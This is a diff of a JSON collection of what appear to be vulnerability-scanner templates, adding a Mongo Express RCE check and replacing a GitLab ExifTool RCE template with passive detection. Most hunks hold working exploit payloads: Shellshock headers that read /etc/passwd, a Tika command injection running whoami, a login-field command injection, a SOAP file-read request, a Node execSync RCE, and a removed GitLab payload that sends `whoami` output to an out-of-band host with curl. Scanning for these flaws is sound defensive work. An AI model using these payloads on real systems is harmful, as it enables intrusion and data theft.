@@ -3229,9 +3229,9 @@
       "requests": [
         {
           "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -5958,11 +5958,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -9811,8 +9811,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -9968,6 +9968,22 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/uploads/wp-file-manager-pro/fm_backup/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-24391",
+      "info": {
+        "name": "Mongo Express Remote Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET / HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /checkValid HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\ndocument=++++++++++++%28%28%29+%3D%3E+%7B%0A++++++++const+process+%3D+clearImmediate.constructor%28%22return+process%3B%22%29%28%29%3B%0A++++++++const+result+%3D+process.mainModule.require%28%22child_process%22%29.execSync%28%22id+%3E+build%2Fcss%2F{{randstr}}.css%22%29%3B%0A++++++++console.log%28%22Result%3A+%22+%2B+result%29%3B%0A++++++++return+true%3B%0A++++%7D%29%28%29++++++++\n",
+            "GET /public/css/{{randstr}}.css HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -10180,9 +10196,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
-            "content-type": "text/xml",
             "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -11999,14 +12015,14 @@
     {
       "id": "CVE-2021-22205",
       "info": {
-        "name": "GitLab CE/EE Unauthenticated RCE using ExifTool",
+        "name": "Fingerprinting GitLab CE/EE Unauthenticated RCE using ExifTool - Passive Detection",
         "severity": "critical"
       },
       "requests": [
         {
-          "raw": [
-            "GET /users/sign_in HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n",
-            "POST /uploads/user HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryIMv3mxRg59TkFSX5\nX-CSRF-Token: {{csrf-token}}\n\n{{hex_decode('0D0A2D2D2D2D2D2D5765624B6974466F726D426F756E64617279494D76336D7852673539546B465358350D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D2266696C65223B2066696C656E616D653D22746573742E6A7067220D0A436F6E74656E742D547970653A20696D6167652F6A7065670D0A0D0A41542654464F524D000003AF444A564D4449524D0000002E81000200000046000000ACFFFFDEBF992021C8914EEB0C071FD2DA88E86BE6440F2C7102EE49D36E95BDA2C3223F464F524D0000005E444A5655494E464F0000000A00080008180064001600494E434C0000000F7368617265645F616E6E6F2E696666004247343400000011004A0102000800088AE6E1B137D97F2A89004247343400000004010FF99F4247343400000002020A464F524D00000307444A5649414E546100000150286D657461646174610A0928436F7079726967687420225C0A22202E2071787B')}}curl `whoami`.{{interactsh-url}}{{hex_decode('7D202E205C0A2220622022292029202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020202020200A0D0A2D2D2D2D2D2D5765624B6974466F726D426F756E64617279494D76336D7852673539546B465358352D2D0D0A')}}\n"
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/users/sign_in"
           ]
         }
       ]
